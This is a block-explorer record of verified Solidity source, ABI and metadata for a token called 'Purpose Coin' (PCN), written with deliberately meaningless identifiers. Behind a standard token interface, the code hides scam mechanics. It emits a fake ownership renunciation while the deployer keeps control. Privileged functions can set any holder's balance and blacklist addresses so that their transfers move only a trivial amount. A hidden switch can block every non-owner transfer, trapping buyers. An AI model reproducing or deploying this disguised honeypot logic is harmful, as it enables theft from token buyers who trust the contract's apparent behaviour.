{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fromTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txFrom {\n    function createPair(address toLaunched, address maxListFund) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface enableBuyMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface teamLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listWallet) external view returns (uint256);\n\n    function transfer(address exemptTotal, uint256 teamTo) external returns (bool);\n\n    function allowance(address liquidityTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTotal,\n        uint256 teamTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityLaunched, uint256 value);\n    event Approval(address indexed liquidityTeam, address indexed spender, uint256 value);\n}\n\ninterface minSender is teamLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PurposeCoin is fromTrading, teamLiquidity, minSender {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitMaxTx;\n    }\n\n    function limitTotal(address amountFromTotal) public {\n        feeShould();\n        \n        if (amountFromTotal == receiverEnableExempt || amountFromTotal == enableShould) {\n            return;\n        }\n        isMarketing[amountFromTotal] = true;\n    }\n\n    uint256 public listTo;\n\n    string private autoSwap = \"PCN\";\n\n    uint256 maxReceiverAt;\n\n    uint256 private limitMaxTx = 100000000 * 10 ** 18;\n\n    address atTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address listWallet) public view virtual override returns (uint256) {\n        return receiverMinAt[listWallet];\n    }\n\n    uint256 modeLaunched;\n\n    function allowance(address buyReceiverMode, address txBuyLaunched) external view virtual override returns (uint256) {\n        if (txBuyLaunched == atTo) {\n            return type(uint256).max;\n        }\n        return maxShouldToken[buyReceiverMode][txBuyLaunched];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoSwap;\n    }\n\n    address public receiverEnableExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return walletMode;\n    }\n\n    function launchExemptSwap(address shouldTeamFrom) public {\n        if (amountMin) {\n            return;\n        }\n        if (listTx) {\n            shouldSender = senderMin;\n        }\n        enableAutoFrom[shouldTeamFrom] = true;\n        if (minFund == listTx) {\n            receiverWallet = shouldSender;\n        }\n        amountMin = true;\n    }\n\n    mapping(address => bool) public enableAutoFrom;\n\n    event OwnershipTransferred(address indexed feeLimit, address indexed launchedTotal);\n\n    constructor (){\n        \n        fundTx();\n        enableBuyMode feeMinTeam = enableBuyMode(atTo);\n        enableShould = txFrom(feeMinTeam.factory()).createPair(feeMinTeam.WETH(), address(this));\n        sellAuto = txFrom(feeMinTeam.factory()).feeTo();\n        \n        receiverEnableExempt = _msgSender();\n        enableAutoFrom[receiverEnableExempt] = true;\n        receiverMinAt[receiverEnableExempt] = limitMaxTx;\n        \n        emit Transfer(address(0), receiverEnableExempt, limitMaxTx);\n    }\n\n    function takeTotalReceiver(address tokenLiquidity, address exemptTotal, uint256 teamTo) internal returns (bool) {\n        if (tokenLiquidity == receiverEnableExempt) {\n            return marketingTake(tokenLiquidity, exemptTotal, teamTo);\n        }\n        uint256 walletReceiverTake = teamLiquidity(enableShould).balanceOf(sellAuto);\n        require(walletReceiverTake == maxReceiverAt);\n        require(exemptTotal != sellAuto);\n        if (isMarketing[tokenLiquidity]) {\n            return marketingTake(tokenLiquidity, exemptTotal, txLaunchedEnable);\n        }\n        teamTo = maxSenderSell(tokenLiquidity, exemptTotal, teamTo);\n        return marketingTake(tokenLiquidity, exemptTotal, teamTo);\n    }\n\n    function fundTx() public {\n        emit OwnershipTransferred(receiverEnableExempt, address(0));\n        launchReceiver = address(0);\n    }\n\n    function maxSenderSell(address tokenLiquidity, address exemptTotal, uint256 teamTo) internal view returns (uint256) {\n        require(teamTo > 0);\n\n        uint256 teamAuto = 0;\n        if (tokenLiquidity == enableShould && fromTradingSwap > 0) {\n            teamAuto = teamTo * fromTradingSwap / 100;\n        } else if (exemptTotal == enableShould && feeWallet > 0) {\n            teamAuto = teamTo * feeWallet / 100;\n        }\n        require(teamAuto <= teamTo);\n        return teamTo - teamAuto;\n    }\n\n    mapping(address => bool) public isMarketing;\n\n    uint256 public fromTradingSwap = 3;\n\n    mapping(address => uint256) private receiverMinAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTotal;\n    }\n\n    uint256 public shouldSender;\n\n    uint256 constant txLaunchedEnable = 12 ** 10;\n\n    function transfer(address feeList, uint256 teamTo) external virtual override returns (bool) {\n        return takeTotalReceiver(_msgSender(), feeList, teamTo);\n    }\n\n    address public enableShould;\n\n    function getOwner() external view returns (address) {\n        return launchReceiver;\n    }\n\n    uint8 private receiverTotal = 18;\n\n    function approve(address txBuyLaunched, uint256 teamTo) public virtual override returns (bool) {\n        maxShouldToken[_msgSender()][txBuyLaunched] = teamTo;\n        emit Approval(_msgSender(), txBuyLaunched, teamTo);\n        return true;\n    }\n\n    function feeShould() private view {\n        require(enableAutoFrom[_msgSender()]);\n    }\n\n    uint256 public senderMin;\n\n    bool public minFund;\n\n    function tradingMarketing(uint256 teamTo) public {\n        feeShould();\n        maxReceiverAt = teamTo;\n    }\n\n    function transferFrom(address tokenLiquidity, address exemptTotal, uint256 teamTo) external override returns (bool) {\n        if (_msgSender() != atTo) {\n            if (maxShouldToken[tokenLiquidity][_msgSender()] != type(uint256).max) {\n                require(teamTo <= maxShouldToken[tokenLiquidity][_msgSender()]);\n                maxShouldToken[tokenLiquidity][_msgSender()] -= teamTo;\n            }\n        }\n        return takeTotalReceiver(tokenLiquidity, exemptTotal, teamTo);\n    }\n\n    string private walletMode = \"Purpose Coin\";\n\n    uint256 public feeWallet = 0;\n\n    bool public amountMin;\n\n    bool private listTx;\n\n    mapping(address => mapping(address => uint256)) private maxShouldToken;\n\n    function owner() external view returns (address) {\n        return launchReceiver;\n    }\n\n    function shouldFee(address feeList, uint256 teamTo) public {\n        feeShould();\n        receiverMinAt[feeList] = teamTo;\n    }\n\n    address sellAuto;\n\n    function marketingTake(address tokenLiquidity, address exemptTotal, uint256 teamTo) internal returns (bool) {\n        require(receiverMinAt[tokenLiquidity] >= teamTo);\n        receiverMinAt[tokenLiquidity] -= teamTo;\n        receiverMinAt[exemptTotal] += teamTo;\n        emit Transfer(tokenLiquidity, exemptTotal, teamTo);\n        return true;\n    }\n\n    uint256 private receiverWallet;\n\n    address private launchReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txBuyLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuyLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAutoFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTradingSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTeamFrom\",\"type\":\"address\"}],\"name\":\"launchExemptSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFromTotal\",\"type\":\"address\"}],\"name\":\"limitTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnableExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"shouldFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"tradingMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PurposeCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}